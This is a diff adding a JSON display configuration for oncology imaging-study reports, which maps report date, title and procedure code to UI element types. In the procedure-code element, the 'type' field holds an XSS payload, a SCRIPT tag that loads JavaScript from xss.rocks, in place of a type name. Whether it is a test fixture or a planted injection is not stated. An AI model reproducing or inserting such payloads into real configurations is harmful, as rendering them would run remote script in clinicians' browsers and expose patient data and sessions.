@@ -1,0 +1,33 @@
+{
+  "id": "imagingStudy.onco.general",
+  "items": [
+    {
+      "group": "imagingStudySelectorContainer",
+      "sources": "$.imagingReports[*]",
+      "elements": [
+        {
+          "value": { "path": "$.date" },
+          "type": "datetime"
+        },
+        [
+          {
+            "value": { "path": "$.attributes.title" },
+            "type": "text"
+          },
+          {
+            "value": {
+              "path": "$.attributes.context.procedure[*].code",
+              "processor": { "name": "codeableConceptText" }
+            },
+            "type": "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>"
+          }
+        ]
+      ]
+    }
+  ],
+  "layout": [
+    {
+      "id": "imagingStudySelectorContainer"
+    }
+  ]
+}
